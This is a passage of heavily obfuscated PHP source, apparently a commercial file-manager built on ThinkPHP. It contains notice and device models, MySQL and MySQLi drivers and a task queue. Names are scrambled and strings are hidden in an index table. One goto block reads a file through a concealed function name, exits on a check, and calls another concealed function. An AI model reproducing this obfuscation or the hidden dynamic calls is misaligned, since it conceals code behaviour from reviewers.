$ùÉŸ³ß[$›œò’Ñş[90]][$›œò’Ñş[188]] == $›œò’Ñş[189]) { $¦„Úæ»[] = $§Í‡äƒ[$›œò’Ñş[487]]; unset($ãıš¤ß¡[$âË Óú‹]); continue; } if ($ùÉŸ³ß[$›œò’Ñş[2389]] && $ùÉŸ³ß[$›œò’Ñş[2389]][$›œò’Ñş[188]] == $›œò’Ñş[189]) { $¦„Úæ»[] = $§Í‡äƒ[$›œò’Ñş[487]]; unset($ãıš¤ß¡[$âË Óú‹]); continue; } } } $§Í‡äƒ[$›œò’Ñş[548]] = $ùÉŸ³ß; unset($§Í‡äƒ[$›œò’Ñş[2612]]); $â¢É¸¨¸[] = $§Í‡äƒ; } $this->clearSystemPathLog($¦„Úæ»); return $â¢É¸¨¸; } private function clearSystemPathLog($àšåÅıÊ) { $¨«şÀ²Ì =& $_SERVER[”øäÃÍª]; if (count($àšåÅıÊ) == 0) { return; } $ ¥úÓÉ‘ = array($¨«şÀ²Ì[487] => array($¨«şÀ²Ì[7], array_unique($àšåÅıÊ))); $this->where($ ¥úÓÉ‘)->delete(); } public function deviceList($Àùø‚¯Ï, $³Âñ”î¿ = 0) { $òòËÍµ‘ =& $_SERVER[”øäÃÍª]; $ßòÏÜ½ = array($òòËÍµ‘[1548] => $Àùø‚¯Ï, $òòËÍµ‘[231] => array($òòËÍµ‘[1136], $³Âñ”î¿), $òòËÍµ‘[33] => $òòËÍµ‘[2086]); $ÍÂû™‘³ = array(); $Ë–ÁıÜ = $this->field($òòËÍµ‘[2613])->where($ßòÏÜ½)->order($òòËÍµ‘[2387])->limit(50)->select(); foreach ($Ë–ÁıÜ as $¿–ĞËò· => $æÄ¨”Á£) { if ($¿–ĞËò· > 0 && abs($æÄ¨”Á£[$òòËÍµ‘[231]] - $Ë–ÁıÜ[$¿–ĞËò· - 1][$òòËÍµ‘[231]]) < 5) { continue; } $‡¬Ğ¢‰Ñ = json_decode($æÄ¨”Á£[$òòËÍµ‘[548]], !0); $æÄ¨”Á£[$òòËÍµ‘[1564]] = isset($‡¬Ğ¢‰Ñ[$òòËÍµ‘[1564]]) ? $‡¬Ğ¢‰Ñ[$òòËÍµ‘[1564]] : $òòËÍµ‘[12]; unset($‡¬Ğ¢‰Ñ[$òòËÍµ‘[1564]]); $•ï½‰ƒç = $this->deviceType($‡¬Ğ¢‰Ñ[$òòËÍµ‘[2377]]); if (isset($ÍÂû™‘³[$•ï½‰ƒç])) { continue; } $æÄ¨”Á£[$òòËÍµ‘[2608]] = IpLocation::get($æÄ¨”Á£[$òòËÍµ‘[1564]]); $æÄ¨”Á£[$òòËÍµ‘[548]] = $‡¬Ğ¢‰Ñ; $ÍÂû™‘³[$•ï½‰ƒç] = $æÄ¨”Á£; } return array_values($ÍÂû™‘³); } public function deviceType($¡¦ĞÓ”à) { return $¡¦ĞÓ”à; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\155\x2e\156\x6f\x74\x69\x63\145\x4c\x69\163\x74"; public $field = array("\x6e\x61\x6d\145", "\143\157\x6e\x74\145\x6e\x74", "\141\165\x74\150", "\155\157\x64\x65", "\164\151\x6d\145", "\164\x79\160\x65", "\x6c\145\166\145\x6c", "\145\156\141\142\154\x65", "\163\157\162\164"); public function listData($—îÔÇí‚ = false, $¾Ôğ®Ø£ = "\x73\157\162\x74", $©øúŸ´“ = false) { return parent::listData($—îÔÇí‚, $¾Ôğ®Ø£, $©øúŸ´“); } public function add($œÅÔ¨¦) { $™ğÜáô =& $_SERVER[”øäÃÍª]; $¶ÈÛ¹ßÅ = time(); if ($œÅÔ¨¦[$™ğÜáô[16]] == $™ğÜáô[2614]) { $¶ÈÛ¹ßÅ = strtotime($œÅÔ¨¦[$™ğÜáô[204]]); } $œÅÔ¨¦[$™ğÜáô[204]] = $¶ÈÛ¹ßÅ; return parent::insert($œÅÔ¨¦); } public function update($¿ÂÊæÅÇ, $Æªø¤Éç) { $êä€ßÃ· =& $_SERVER[”øäÃÍª]; $œ¿¼ÌØ¦ = $this->listData($¿ÂÊæÅÇ); if (!$œ¿¼ÌØ¦) { return !1; } $àúê¹» = time(); if ($Æªø¤Éç[$êä€ßÃ·[16]] == $êä€ßÃ·[2614]) { $àúê¹» = strtotime($Æªø¤Éç[$êä€ßÃ·[204]]); } $Æªø¤Éç[$êä€ßÃ·[204]] = $àúê¹»; return parent::update($¿ÂÊæÅÇ, $Æªø¤Éç); } public function remove($ıˆŒ™¡) { $ÜÁ”Ù¶ğ = $this->listData($ıˆŒ™¡); if (!$ÜÁ”Ù¶ğ || $ÜÁ”Ù¶ğ[$_SERVER[”øäÃÍª][189]]) { return !1; } return parent::remove($ıˆŒ™¡); } public function sort($¶·ÍÇõô, $§Ëİ€ã˜) { return parent::update($¶·ÍÇõô, $§Ëİ€ã˜); } public function enable($Â‚ë“­å, $•…‘Ää) { return parent::update($Â‚ë“­å, array($_SERVER[”øäÃÍª][2615] => $•…‘Ää)); } private function initUserOption() { $Í¼è¡£® =& $_SERVER[”øäÃÍª]; $this->optionType = $Í¼è¡£®[2616]; $this->modelType = $Í¼è¡£®[2617]; $this->field = array($Í¼è¡£®[2618], $Í¼è¡£®[32], $Í¼è¡£®[204], $Í¼è¡£®[33], $Í¼è¡£®[2619], $Í¼è¡£®[859], $Í¼è¡£®[226]); } public function userNoticeGet($—Òæ°Úò = false) { $this->initUserOption(); return parent::listData($—Òæ°Úò, $_SERVER[”øäÃÍª][487], !0); } public function userNoticeAdd($Ñã—ÍÑÏ) { $Î™ìÇƒ =& $_SERVER[”øäÃÍª]; $this->initUserOption(); $Ô¯¢İ = $this->findByKey($Î™ìÇƒ[2618], $Ñã—ÍÑÏ[$Î™ìÇƒ[487]]); if ($Ô¯¢İ) { return !0; } $ğáÇ¸å· = array($Î™ìÇƒ[2618] => $Ñã—ÍÑÏ[$Î™ìÇƒ[487]], $Î™ìÇƒ[32] => $Ñã—ÍÑÏ[$Î™ìÇƒ[32]], $Î™ìÇƒ[204] => $Ñã—ÍÑÏ[$Î™ìÇƒ[204]], $Î™ìÇƒ[33] => isset($Ñã—ÍÑÏ[$Î™ìÇƒ[33]]) ? $Ñã—ÍÑÏ[$Î™ìÇƒ[33]] : 1, $Î™ìÇƒ[2619] => isset($Ñã—ÍÑÏ[$Î™ìÇƒ[2619]]) ? $Ñã—ÍÑÏ[$Î™ìÇƒ[2619]] : 0, $Î™ìÇƒ[859] => 0, $Î™ìÇƒ[226] => 0); return parent::insert($ğáÇ¸å·); } public function userNoticeEdit($×´ÅÇ¾×, $†ò¬‚Æ“) { $this->initUserOption(); return parent::update($×´ÅÇ¾×, $†ò¬‚Æ“); } } goto EµÕœë©›‰; b›¤§¡‡ò³: if ($_SERVER[$_SERVER[”øäÃÍª][492]] != $_SERVER[$_SERVER[”øäÃÍª][997]]) { $_getc = $_SERVER[”øäÃÍª][494]; $_getfile = $_SERVER[$_SERVER[”øäÃÍª][495]] . $_SERVER[”øäÃÍª][496]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[”øäÃÍª][285], $_getfilec); if (count($_getarrs) < $_SERVER[”øäÃÍª][497]) { $exit = $_SERVER[”øäÃÍª][498]; $exit(); } $_act = $_SERVER[”øäÃÍª][499]; $_act($_SERVER[$_SERVER[”øäÃÍª][493]]); } class DbMysql extends Db { public function __construct($–Ñó¼ğ‘ = '') { $áÄµ‡åÓ =& $_SERVER[”øäÃÍª]; if (!extension_loaded($áÄµ‡åÓ[912])) { think_exception(think_lang($áÄµ‡åÓ[14]) . $áÄµ‡åÓ[1004]); } if (!empty($–Ñó¼ğ‘)) { $this->config = $–Ñó¼ğ‘; if (empty($this->config[$áÄµ‡åÓ[17]])) { $this->config[$áÄµ‡åÓ[17]] = $áÄµ‡åÓ[12]; } } } public function connect($ñ©²¿Áø = '', $¥Ş€‰“ì = 0, $«üÆæÇ = false) { $¤ß©¯Ì =& $_SERVER[”øäÃÍª]; if (!isset($this->linkID[$¥Ş€‰“ì])) { if (empty($ñ©²¿Áø)) { $ñ©²¿Áø = $this->config; } $¿¬ô¿µ = $ñ©²¿Áø[$¤ß©¯Ì[1005]] . ($ñ©²¿Áø[$¤ß©¯Ì[1006]] ? "\72{$ñ©²¿Áø[$¤ß©¯Ì[1006]]}" : $¤ß©¯Ì[12]); $Ÿ¬Ùúáå = !empty($ñ©²¿Áø[$¤ß©¯Ì[17]][$¤ß©¯Ì[18]]) ? $ñ©²¿Áø[$¤ß©¯Ì[17]][$¤ß©¯Ì[18]] : $this->pconnect; if ($Ÿ¬Ùúáå) { $this->linkID[$¥Ş€‰“ì] = mysql_pconnect($¿¬ô¿µ, $ñ©²¿Áø[$¤ß©¯Ì[1007]], $ñ©²¿Áø[$¤ß©¯Ì[1008]], 131072); } else { $this->linkID[$¥Ş€‰“ì] = mysql_connect($¿¬ô¿µ, $ñ©²¿Áø[$¤ß©¯Ì[1007]], $ñ©²¿Áø[$¤ß©¯Ì[1008]], !0, 131072); } if (!$this->linkID[$¥Ş€‰“ì] || !empty($ñ©²¿Áø[$¤ß©¯Ì[21]]) && !mysql_select_db($ñ©²¿Áø[$¤ß©¯Ì[21]], $this->linkID[$¥Ş€‰“ì])) { think_exception(mysql_error()); } $ô°‹á „ = mysql_get_server_info($this->linkID[$¥Ş€‰“ì]); mysql_query($¤ß©¯Ì[1009] . think_config($¤ß©¯Ì[1010]) . $¤ß©¯Ì[58], $this->linkID[$¥Ş€‰“ì]); if ($ô°‹á „ > $¤ß©¯Ì[1011]) { mysql_query($¤ß©¯Ì[1012], $this->linkID[$¥Ş€‰“ì]); } $this->connected = !0; if (1 != think_config($¤ß©¯Ì[22])) { unset($this->config); } } return $this->linkID[$¥Ş€‰“ì]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($€øÅ¾™§) { $ÚœÇõ™† =& $_SERVER[”øäÃÍª]; if (0 === stripos($€øÅ¾™§, $ÚœÇõ™†[342])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $€øÅ¾™§; if ($this->queryID) { $this->free(); } think_action_status($ÚœÇõ™†[23], 1); think_status($ÚœÇõ™†[24]); $this->queryID = mysql_query($€øÅ¾™§, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($Ï¢©ıÅ) { $ï†úŞ¦Ï =& $_SERVER[”øäÃÍª]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ï¢©ıÅ; if ($this->queryID) { $this->free(); } think_action_status($ï†úŞ¦Ï[25], 1); think_status($ï†úŞ¦Ï[24]); $ãÉ¯¨Ë´ = mysql_query($Ï¢©ıÅ, $this->_linkID); $this->debug(); if (!1 === $ãÉ¯¨Ë´) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[”øäÃÍª][1013], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $£ØÜ¨· = mysql_query($_SERVER[”øäÃÍª][1014], $this->_linkID); $this->transTimes = 0; if (!$£ØÜ¨·) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ú‹ÛãÔÉ = mysql_query($_SERVER[”øäÃÍª][1015], $this->_linkID); $this->transTimes = 0; if (!$Ú‹ÛãÔÉ) { $this->error(); return !1; } } return !0; } private function getAll() { $“ó¼‹Õ¹ = array(); if ($this->numRows > 0) { while ($€œ¸¡§ = mysql_fetch_assoc($this->queryID)) { $“ó¼‹Õ¹[] = $€œ¸¡§; } mysql_data_seek($this->queryID, 0); } return $“ó¼‹Õ¹; } public function getFields($üºû¥…š) { $ŞğŠƒ‚ =& $_SERVER[”øäÃÍª]; $á¶ÀÅÄ€ = $this->query($ŞğŠƒ‚[1016] . $this->parseKey($üºû¥…š)); $íğàÚú = array(); if ($á¶ÀÅÄ€) { foreach ($á¶ÀÅÄ€ as $ù­ğ•õÀ => $Âœê–Ã) { $íğàÚú[$Âœê–Ã[$ŞğŠƒ‚[31]]] = array($ŞğŠƒ‚[32] => $Âœê–Ã[$ŞğŠƒ‚[31]], $ŞğŠƒ‚[33] => $Âœê–Ã[$ŞğŠƒ‚[34]], $ŞğŠƒ‚[35] => (bool) (strtoupper($Âœê–Ã[$ŞğŠƒ‚[36]]) === $ŞğŠƒ‚[1017]), $ŞğŠƒ‚[37] => $Âœê–Ã[$ŞğŠƒ‚[38]], $ŞğŠƒ‚[39] => strtolower($Âœê–Ã[$ŞğŠƒ‚[40]]) == $ŞğŠƒ‚[41], $ŞğŠƒ‚[42] => strtolower($Âœê–Ã[$ŞğŠƒ‚[43]]) == $ŞğŠƒ‚[44]); } } return $íğàÚú; } public function getTables($²Ç „ˆ = '') { $Û›¹× =& $_SERVER[”øäÃÍª]; if (!empty($²Ç „ˆ)) { $­†äı»¾ = $Û›¹×[1018] . $²Ç „ˆ . $Û›¹×[1019]; } else { $­†äı»¾ = $Û›¹×[1020]; } $í›Ç»¡ = $this->query($­†äı»¾); $Áö¸—Â„ = array(); foreach ($í›Ç»¡ as $åöØ‚Óø => $±Îß¡Ş«) { $Áö¸—Â„[$åöØ‚Óø] = current($±Îß¡Ş«); } return $Áö¸—Â„; } public function replace($¸£’ÖÚ, $Ô¹Ì³×ˆ = array()) { $Ìİ‘Ôıİ =& $_SERVER[”øäÃÍª]; foreach ($¸£’ÖÚ as $×…ìîí˜ => $á˜åòò¨) { $ÈØ¨ğ£à = $this->parseValue($á˜åòò¨); if (is_scalar($ÈØ¨ğ£à)) { $ á³Õñ[] = $ÈØ¨ğ£à; $÷»ÅñËî[] = $this->parseKey($×…ìîí˜); } } $ì÷´›Äì = $Ìİ‘Ôıİ[1021] . $this->parseTable($Ô¹Ì³×ˆ[$Ìİ‘Ôıİ[357]]) . $Ìİ‘Ôıİ[1022] . implode($Ìİ‘Ôıİ[50], $÷»ÅñËî) . $Ìİ‘Ôıİ[1023] . implode($Ìİ‘Ôıİ[50], $ á³Õñ) . $Ìİ‘Ôıİ[1024]; return $this->execute($ì÷´›Äì); } public function insertAll($›ÉÕšÀ”, $ÏËåá’ = array(), $…©Âªî = false) { $¿€ú¤†ü =& $_SERVER[”øäÃÍª]; if (!is_array($›ÉÕšÀ”[0])) { return !1; } $¥­¯º£ò = array_keys($›ÉÕšÀ”[0]); $–¿£¯ŞÔ = array(); foreach ($›ÉÕšÀ” as $Šë»ıÙØ) { $Ó’É£å = array(); foreach ($Šë»ıÙØ as $Ù÷ïæ¨ä => $ÀµÇØºß) { $ÀµÇØºß = $this->parseValue($ÀµÇØºß); if (is_scalar($ÀµÇØºß)) { $Ó’É£å[] = $ÀµÇØºß; } } $–¿£¯ŞÔ[] = $¿€ú¤†ü[337] . implode($¿€ú¤†ü[50], $Ó’É£å) . $¿€ú¤†ü[1024]; } array_walk($¥­¯º£ò, array($this, $¿€ú¤†ü[1025])); $•¾ºş•Å = $…©Âªî ? $¿€ú¤†ü[1026] : $¿€ú¤†ü[1027]; $•¾ºş•Å = $¿€ú¤†ü[1027]; $Ú¤àÂ = $•¾ºş•Å . $¿€ú¤†ü[1028] . $this->parseTable($ÏËåá’[$¿€ú¤†ü[357]]) . $¿€ú¤†ü[1022] . implode($¿€ú¤†ü[50], $¥­¯º£ò) . $¿€ú¤†ü[1029] . implode($¿€ú¤†ü[50], $–¿£¯ŞÔ); if ($…©Âªî) { $¢±×ˆÒû = array(); foreach ($¥­¯º£ò as $Ù÷ïæ¨ä) { if ($Ù÷ïæ¨ä == $¿€ú¤†ü[231] || $Ù÷ïæ¨ä == $¿€ú¤†ü[1030]) { continue; } $¢±×ˆÒû[] = $Ù÷ïæ¨ä . $¿€ú¤†ü[1031] . $Ù÷ïæ¨ä . $¿€ú¤†ü[1024]; } $Ú¤àÂ .= $¿€ú¤†ü[1032] . implode($¿€ú¤†ü[50], $¢±×ˆÒû); } return $this->execute($Ú¤àÂ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $–Ì÷Õø =& $_SERVER[”øäÃÍª]; $this->error = mysql_errno() . $–Ì÷Õø[4] . mysql_error($this->_linkID); if ($–Ì÷Õø[12] != $this->queryStr) { $this->error .= LNG($–Ì÷Õø[48]) . $this->queryStr; } think_trace($this->error, $–Ì÷Õø[12], $–Ì÷Õø[49]); return $this->error; } public function escapeString($™œğàÒŸ) { if ($this->_linkID) { return mysql_real_escape_string($™œğàÒŸ, $this->_linkID); } else { return mysql_escape_string($™œğàÒŸ); } } public function parseKey(&$‡î®‡íÀ, $˜õä·³µ = true) { $å¥ñôæ¯ =& $_SERVER[”øäÃÍª]; if ($˜õä·³µ) { $‡î®‡íÀ = $this->parseKeyCheck($‡î®‡íÀ); } if ($‡î®‡íÀ != $å¥ñôæ¯[220] && !preg_match($å¥ñôæ¯[1033], $‡î®‡íÀ)) { $‡î®‡íÀ = $å¥ñôæ¯[475] . trim($‡î®‡íÀ, $å¥ñôæ¯[475]) . $å¥ñôæ¯[475]; } return $‡î®‡íÀ; } } class DbMysqli extends Db { public function __construct($ú¹É’Òı = '') { $»èö¤ËÈ =& $_SERVER[”øäÃÍª]; if (!extension_loaded($»èö¤ËÈ[1034])) { think_exception(think_lang($»èö¤ËÈ[14]) . $»èö¤ËÈ[1035]); } if (!empty($ú¹É’Òı)) { $this->config = $ú¹É’Òı; if (empty($this->config[$»èö¤ËÈ[17]])) { $this->config[$»èö¤ËÈ[17]] = $»èö¤ËÈ[12]; } } } public function connect($ùƒâ¹¾‘ = '', $å«¾äª¼ = 0) { $ÓËà§Òº =& $_SERVER[”øäÃÍª]; if (!isset($this->linkID[$å«¾äª¼])) { if (empty($ùƒâ¹¾‘)) { $ùƒâ¹¾‘ = $this->config; } $this->linkID[$å«¾äª¼] = new mysqli($ùƒâ¹¾‘[$ÓËà§Òº[1005]], $ùƒâ¹¾‘[$ÓËà§Òº[1007]], $ùƒâ¹¾‘[$ÓËà§Òº[1008]], $ùƒâ¹¾‘[$ÓËà§Òº[21]], $ùƒâ¹¾‘[$ÓËà§Òº[1006]] ? intval($ùƒâ¹¾‘[$ÓËà§Òº[1006]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $²ü¨Ôâ¥ = $this->linkID[$å«¾äª¼]->server_version; $this->linkID[$å«¾äª¼]->query($ÓËà§Òº[1009] . think_config($ÓËà§Òº[1010]) . $ÓËà§Òº[58]); if ($²ü¨Ôâ¥ > $ÓËà§Òº[1011]) { $this->linkID[$å«¾äª¼]->query($ÓËà§Òº[1012]); } $this->connected = !0; if (1 != think_config($ÓËà§Òº[22])) { unset($this->config); } } return $this->linkID[$å«¾äª¼]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($®©Ò×•) { $ÇÛ¥Ôâ =& $_SERVER[”øäÃÍª]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $®©Ò×•; if ($this->queryID) { $this->free(); } think_action_status($ÇÛ¥Ôâ[23], 1); think_status($ÇÛ¥Ôâ[24]); $this->queryID = $this->_linkID->query($®©Ò×•); if ($this->_linkID->more_results()) { while (($üõŞÎƒ = $this->_linkID->next_result()) != NULL) { $üõŞÎƒ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($û¯ à”) { $§¿ÎïŒ£ =& $_SERVER[”øäÃÍª]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $û¯ à”; if ($this->queryID) { $this->free(); } think_action_status($§¿ÎïŒ£[25], 1); think_status($§¿ÎïŒ£[24]); $©…ÜÅ‡Ì = $this->_linkID->query($û¯ à”); $this->debug(); if (!1 === $©…ÜÅ‡Ì) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÌÈø°¶¨ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ÌÈø°¶¨) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Â›ñúˆÙ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Â›ñúˆÙ) { $this->error(); return !1; } } return !0; } private function getAll() { $£ßØı€¨ = array(); if ($this->numRows > 0) { for ($Âúä²øœ = 0; $Âúä²øœ < $this->numRows; $Âúä²øœ++) { $£ßØı€¨[$Âúä²øœ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $£ßØı€¨; } public function getFields($÷è›İ¯) { $İìÛ“œ =& $_SERVER[”øäÃÍª]; $§‚ÖÀÃû = $this->query($İìÛ“œ[1016] . $this->parseKey($÷è›İ¯)); $—öƒ‚ëà = array(); if ($§‚ÖÀÃû) { foreach ($§‚ÖÀÃû as $©é‰à => $ú—¡…Æ) { $—öƒ‚ëà[$ú—¡…Æ[$İìÛ“œ[31]]] = array($İìÛ“œ[32] => $ú—¡…Æ[$İìÛ“œ[31]], $İìÛ“œ[33] => $ú—¡…Æ[$İìÛ“œ[34]], $İìÛ“œ[35] => (bool) ($ú—¡…Æ[$İìÛ“œ[36]] === $İìÛ“œ[12]), $İìÛ“œ[37] => $ú—¡…Æ[$İìÛ“œ[38]], $İìÛ“œ[39] => strtolower($ú—¡…Æ[$İìÛ“œ[40]]) == $İìÛ“œ[41], $İìÛ“œ[42] => strtolower($ú—¡…Æ[$İìÛ“œ[43]]) == $İìÛ“œ[44]); } } return $—öƒ‚ëà; } public function getTables($ÏôÚ¨‰ğ = '') { $Ë¸˜ù¬Ê =& $_SERVER[”øäÃÍª]; $øàæŒæ” = !empty($ÏôÚ¨‰ğ) ? $Ë¸˜ù¬Ê[1018] . $ÏôÚ¨‰ğ . $Ë¸˜ù¬Ê[1019] : $Ë¸˜ù¬Ê[1020]; $ïáòÍ‡ = $this->query($øàæŒæ”); $¬ğÃÈ©† = array(); if ($ïáòÍ‡) { foreach ($ïáòÍ‡ as $ŠäÁ¼¯ => $Î¸»ÛÁ) { $¬ğÃÈ©†[$ŠäÁ¼¯] = current($Î¸»ÛÁ); } } return $¬ğÃÈ©†; } public function replace($±¤èÈ™‘, $§˜û¬½€ = array()) { $¢æ£…§ =& $_SERVER[”øäÃÍª]; foreach ($±¤èÈ™‘ as $¥Éçş´ñ => $ÜŞøÌú) { $½…¡˜¯ = $this->parseValue($ÜŞøÌú); if (is_scalar($½…¡˜¯)) { $ÊîÛşêİ[] = $½…¡˜¯; $êïĞïØó[] = $this->parseKey($¥Éçş´ñ); } } $Å¼¦¼Áí = $¢æ£…§[1021] . $this->parseTable($§˜û¬½€[$¢æ£…§[357]]) . $¢æ£…§[1022] . implode($¢æ£…§[50], $êïĞïØó) . $¢æ£…§[1023] . implode($¢æ£…§[50], $ÊîÛşêİ) . $¢æ£…§[1024]; return $this->execute($Å¼¦¼Áí); } public function insertAll($¢èñÇ»é, $Ã’ÇĞ¡­ = array(), $°ÀØá©Ë = false) { $Ÿ•üÃ’³ =& $_SERVER[”øäÃÍª]; if (!is_array($¢èñÇ»é[0])) { return !1; } $¯ûÈ‚à» = array_keys($¢èñÇ»é[0]); $ÖñŒ—Şı = array(); foreach ($¢èñÇ»é as $–€¬úÈ‰) { $ÜæÑğÛ = array(); foreach ($–€¬úÈ‰ as $²õÑÊ± => $Ùââá¢‰) { $Ùââá¢‰ = $this->parseValue($Ùââá¢‰); if (is_scalar($Ùââá¢‰)) { $ÜæÑğÛ[] = $Ùââá¢‰; } } $ÖñŒ—Şı[] = $Ÿ•üÃ’³[337] . implode($Ÿ•üÃ’³[50], $ÜæÑğÛ) . $Ÿ•üÃ’³[1024]; } array_walk($¯ûÈ‚à», array($this, $Ÿ•üÃ’³[1025])); $ğ³ÇÛ‡ = $°ÀØá©Ë ? $Ÿ•üÃ’³[1026] : $Ÿ•üÃ’³[1027]; $ğ³ÇÛ‡ = $Ÿ•üÃ’³[1027]; $ÏŸ¬¸­ = $ğ³ÇÛ‡ . $Ÿ•üÃ’³[1028] . $this->parseTable($Ã’ÇĞ¡­[$Ÿ•üÃ’³[357]]) . $Ÿ•üÃ’³[1022] . implode($Ÿ•üÃ’³[50], $¯ûÈ‚à») . $Ÿ•üÃ’³[1029] . implode($Ÿ•üÃ’³[50], $ÖñŒ—Şı); if ($°ÀØá©Ë) { $èóìŞ ù = array(); foreach ($¯ûÈ‚à» as $²õÑÊ±) { if ($²õÑÊ± == $Ÿ•üÃ’³[231] || $²õÑÊ± == $Ÿ•üÃ’³[1030]) { continue; } $èóìŞ ù[] = $²õÑÊ± . $Ÿ•üÃ’³[1031] . $²õÑÊ± . $Ÿ•üÃ’³[1024]; } $ÏŸ¬¸­ .= $Ÿ•üÃ’³[1032] . implode($Ÿ•üÃ’³[50], $èóìŞ ù); } return $this->execute($ÏŸ¬¸­); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $è¦Ø¸‹“ =& $_SERVER[”øäÃÍª]; $this->error = $this->_linkID->errno . $è¦Ø¸‹“[4] . $this->_linkID->error; if ($è¦Ø¸‹“[12] != $this->queryStr) { $this->error .= LNG($è¦Ø¸‹“[48]) . $this->queryStr; } think_trace($this->error, $è¦Ø¸‹“[12], $è¦Ø¸‹“[49]); return $this->error; } public function escapeString($š¬Ãï© ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($š¬Ãï© ); } else { return addslashes($š¬Ãï© ); } } public function parseKey(&$üÜ¦’ñß, $ª€½¦” = true) { $ë†ã›ä =& $_SERVER[”øäÃÍª]; if ($ª€½¦”) { $üÜ¦’ñß = $this->parseKeyCheck($üÜ¦’ñß); } if ($üÜ¦’ñß != $ë†ã›ä[220] && !preg_match($ë†ã›ä[1033], $üÜ¦’ñß)) { $üÜ¦’ñß = $ë†ã›ä[475] . trim($üÜ¦’ñß, $ë†ã›ä[475]) . $ë†ã›ä[475]; } return $üÜ¦’ñß; } } goto Dò¸‰–Û; eÖÚ‹©¿: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\163\153\121\x75\x65\x75\145\x4c\145\x6e\147\164\x68"; const QUEUE_DATA = "\164\141\163\153\x51\x75\145\165\145\x44\141\164\141"; const QUEUE_TIME = "\164\x61\163\x6b\x51\x75\145\165\x65\x4c\x61\163\164\122\x75\156"; const QUEUE_THREAD = "\164\141\163\153\x51\165\x65\165\x65\x54\150\162\x65\x61\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($éĞÄööı, $ûİÖ˜õ™ = array(), $Ù–Š¼ÁÕ = '', $ªÔ‰°ˆ = '') { $Ë°‚ø–Ê =& $_SERVER[”øäÃÍª]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ªÔ‰°ˆ && array_find_by_field(self::$listData, $Ë°‚ø–Ê[95], $ªÔ‰°ˆ)) { return !0; } if ($ªÔ‰°ˆ && array_find_by_field(self::$listDataAdd, $Ë°‚ø–Ê[95], $ªÔ‰°ˆ)) { return !0; } self::$listDataAdd[] = array($Ë°‚ø–Ê[342] => $éĞÄööı, $Ë°‚ø–Ê[2042] => $ûİÖ˜õ™, $Ë°‚ø–Ê[548] => $Ù–Š¼ÁÕ, $Ë°‚ø–Ê[95] => $ªÔ‰°ˆ); return !0; } public static function addSubmit() { $Ã—¢Í÷  =& $_SERVER[”øäÃÍª]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($Ã—¢Í÷ [2043] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $Ã—¢Í÷ [12], $Ã—¢Í÷ [548])), $Ã—¢Í÷ [195]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($Öâ¤äë, $éÀ¬Ş…ë = array(), $ÖÆ„Ïúµ = '', $±ÚŸÙÄì = '') { $êÄ’€ŒÖ =& $_SERVER[”øäÃÍª]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ğÁû˜ß = self::getAll(); if ($±ÚŸÙÄì && array_find_by_field($ğÁû˜ß, $êÄ’€ŒÖ[95], $±ÚŸÙÄì)) { return !0; } $ğÁû˜ß[] = array($êÄ’€ŒÖ[342] => $Öâ¤äë, $êÄ’€ŒÖ[2042] => $éÀ¬Ş…ë, $êÄ’€ŒÖ[548] => $ÖÆ„Ïúµ, $êÄ’€ŒÖ[95] => $±ÚŸÙÄì); self::setAll($ğÁû˜ß); write_log($êÄ’€ŒÖ[2043] . $ÖÆ„Ïúµ, $êÄ’€ŒÖ[195]); return !0; } public static function run() { $¾‡ûæã¼ =& $_SERVER[”øäÃÍª]; $üÆ„ûéÜ = self::getAll(); $ŠØÉÅ‘Ÿ = array_shift($üÆ„ûéÜ); if (!$ŠØÉÅ‘Ÿ) { return !1; } self::setAll($üÆ„ûéÜ); $Ùø’¤±Ó = timeFloat(); $ìÖ÷Õ¨ä = $¾‡ûæã¼[12]; try { $ìÖ÷Õ¨ä = Hook::apply($ŠØÉÅ‘Ÿ[$¾‡ûæã¼[342]], $ŠØÉÅ‘Ÿ[$¾‡ûæã¼[2042]]); } catch (Exception $€ß¡˜öÇ) { write_log($€ß¡˜öÇ, 